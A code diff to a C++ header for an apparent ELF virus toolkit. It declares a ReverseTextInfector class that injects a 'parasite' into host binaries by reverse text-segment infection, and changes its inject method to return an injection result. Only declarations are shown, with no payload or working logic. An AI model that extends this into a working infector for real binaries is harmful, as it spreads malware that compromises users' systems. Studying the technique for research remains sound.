@@ -1,6 +1,8 @@
 #pragma once
 #include <elf.h>
+#include <optional>
 #include <span>
+#include "infector/injection_result.hh"
 
 namespace vt::infector {
 // This method was discussed by Silvio but no working prototype was provided.
@@ -75,8 +77,9 @@ class ReverseTextInfector {
   bool analyze(std::span<const std::byte> host_mapping,
                std::span<const std::byte> parasite_mapping);
 
-  bool inject(std::span<std::byte> host_mapping,
-              std::span<const std::byte> parasite_mapping);
+  std::optional<InjectionResult> inject(
+      std::span<std::byte> host_mapping,
+      std::span<const std::byte> parasite_mapping);
 
  private:
   size_t host_size_{};
@@ -86,6 +89,7 @@ class ReverseTextInfector {
   size_t padded_virus_size_{};
   Elf64_Addr original_e_entry_{};
   Elf64_Addr original_code_segment_p_vaddr_{};
+  Elf64_Addr parasite_load_address_{};
   Elf64_Off original_code_segment_file_offset_{};
   size_t code_segment_idx_{};
 };
